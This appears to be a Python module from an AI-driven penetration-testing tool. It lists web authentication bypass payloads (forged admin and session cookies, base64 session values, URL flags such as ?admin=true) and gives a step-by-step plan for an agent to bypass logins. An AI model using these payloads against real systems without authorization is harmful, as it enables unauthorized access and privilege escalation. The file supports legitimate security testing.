"""Web Authentication Bypass Payloads for NumaSec.

Critical for web application security assessments and penetration testing.

Includes:
- Cookie manipulation (admin=true, authenticated=true, etc.)
- Session token guessing
- JWT attacks
- Parameter tampering
- Common auth bypass patterns

Usage: Agent automatically retrieves relevant payloads via RAG when
web authentication is detected.
"""

from numasec.knowledge.store import PayloadEntry, generate_payload_id

# ============================================================================
# Cookie Manipulation Payloads
# ============================================================================

COOKIE_MANIPULATION_PAYLOADS = [
    # Boolean cookies
    PayloadEntry(
        id=generate_payload_id("web_auth", "cookie_admin_true"),
        name="Admin Cookie - Boolean True",
        category="web_auth",
        payload="admin=true",
        description="Set admin cookie to boolean true value",
        use_case="Cookie-based authentication bypass, common in vulnerable web applications",
        bypass_technique="cookie-manipulation",
       context="header",
        tags=["cookie", "admin", "bypass", "auth"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "cookie_authenticated_true"),
        name="Authenticated Cookie",
        category="web_auth",
        payload="authenticated=true",
        description="Set authenticated cookie to true",
        use_case="Session spoofing, bypass login requirement",
        bypass_technique="cookie-manipulation",
        context="header",
        tags=["cookie", "session", "bypass"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "cookie_role_admin"),
        name="Role Admin Cookie",
        category="web_auth",
        payload="role=admin",
        description="Set role cookie to admin value",
        use_case="RBAC bypass, privilege escalation",
        bypass_technique="cookie-manipulation",
        context="header",
        tags=["cookie", "rbac", "bypass"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "cookie_user_admin"),
        name="User Admin Cookie",
        category="web_auth",
        payload="user=admin",
        description="Set user cookie to admin username",
        use_case="Username spoofing in session cookies",
        bypass_technique="cookie-manipulation",
        context="header",
        tags=["cookie", "user", "bypass"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "cookie_isadmin_1"),
        name="isAdmin Cookie Numeric",
        category="web_auth",
        payload="isAdmin=1",
        description="Set isAdmin to numeric 1",
        use_case="Numeric boolean bypass",
        bypass_technique="cookie-manipulation",
        context="header",
        tags=["cookie", "admin", "bypass"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "cookie_isadmin_true"),
        name="isAdmin Cookie Boolean",
        category="web_auth",
        payload="isAdmin=true",
        description="Set isAdmin to boolean true",
        use_case="Boolean admin flag",
        bypass_technique="cookie-manipulation",
        context="header",
        tags=["cookie", "admin"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "cookie_privileges_admin"),
        name="Privileges Admin Cookie",
        category="web_auth",
        payload="privileges=admin",
        description="Set privileges to admin",
        use_case="Privilege escalation via cookie",
        bypass_technique="cookie-manipulation",
        context="header",
        tags=["cookie", "privileges"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "cookie_loggedin_true"),
        name="LoggedIn Cookie",
        category="web_auth",
        payload="loggedIn=true",
        description="Set loggedIn to true",
        use_case="Simple authentication flag",
        bypass_technique="cookie-manipulation",
        context="header",
        tags=["cookie", "auth"],
    ),
]

# ============================================================================
# Session Token Manipulation
# ============================================================================

SESSION_MANIPULATION_PAYLOADS = [
    PayloadEntry(
        id=generate_payload_id("web_auth", "session_username"),
        name="Session Username Direct",
        category="web_auth",
        payload="session=admin",
        description="Set session to target username directly",
        use_case="When session cookie contains username in plaintext",
        bypass_technique="session-manipulation",
        context="header",
        tags=["session", "username"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "session_base64_admin"),
        name="Session Base64 Admin",
        category="web_auth",
        payload="session=YWRtaW4=",  # base64('admin')
        description="Base64 encoded admin username",
        use_case="Session ID is base64 encoded username",
        bypass_technique="session-manipulation",
        context="header",
        tags=["session", "base64"],
    ),
]

# ============================================================================
# URL Parameter Auth Bypass
# ============================================================================

URL_PARAM_BYPASS_PAYLOADS = [
    PayloadEntry(
        id=generate_payload_id("web_auth", "param_admin_true"),
        name="URL Parameter admin=true",
        category="web_auth",
        payload="?admin=true",
        description="Add admin parameter to URL",
        use_case="Query parameter privilege escalation",
        bypass_technique="parameter-tampering",
        context="url",
        tags=["url", "admin"],
    ),
    PayloadEntry(
        id=generate_payload_id("web_auth", "param_bypass_1"),
        name="URL Parameter bypass=1",
        category="web_auth",
        payload="?bypass=1",
        description="Generic bypass parameter",
        use_case="Developer debug flags",
        bypass_technique="parameter-tampering",
        context="url",
        tags=["url", "bypass"],
    ),
]

# Combined list for export
WEB_AUTH_PAYLOADS = (
    COOKIE_MANIPULATION_PAYLOADS +
    SESSION_MANIPULATION_PAYLOADS +
    URL_PARAM_BYPASS_PAYLOADS
)

# ============================================================================
# Systematic Testing Strategy
# ============================================================================

WEB_AUTH_STRATEGY = {
    "name": "Web Authentication Systematic Testing",
    "description": "Step-by-step approach to bypass web authentication",
    "phases": [
        {
            "name": "reconnaissance",
            "priority": 1,
            "actions": [
                "Identify auth mechanism (cookies, sessions, JWT, basic auth)",
                "Check for /logout, /admin, /flag endpoints",
                "Examine response headers for Set-Cookie",
                "Note any existing cookies in requests",
            ]
        },
        {
            "name": "cookie_bypass",
            "priority": 2,
            "critical": True,
            "actions": [
                "Try admin=true cookie",
                "Try authenticated=true cookie",
                "Try role=admin cookie",
                "Try user=admin or user=targetUsername cookie",
                "Try isAdmin=1 and isAdmin=true cookies",
                "Try loggedIn=true cookie",
            ],
            "note": "Test EACH cookie individually, then in combinations"
        },
        {
            "name": "session_manipulation",
            "priority": 3,
            "actions": [
                "Set session=admin",
                "Set session=targetUsername",
                "Try base64 encoded usernames",
                "Try sequential IDs (session=1, session=2, etc.)",
            ]
        },
        {
            "name": "url_parameters",
            "priority": 4,
            "actions": [
                "Add ?admin=true to URLs",
                "Add ?bypass=1 to URLs",
                "Add ?debug=true to URLs",
            ]
        }
    ],
    "success_indicators": [
        "Logout link appears",
        "Welcome message with username",
        "Access to /flag endpoint",
        "Dashboard or admin panel visible",
        "Different content than login page",
    ]
}
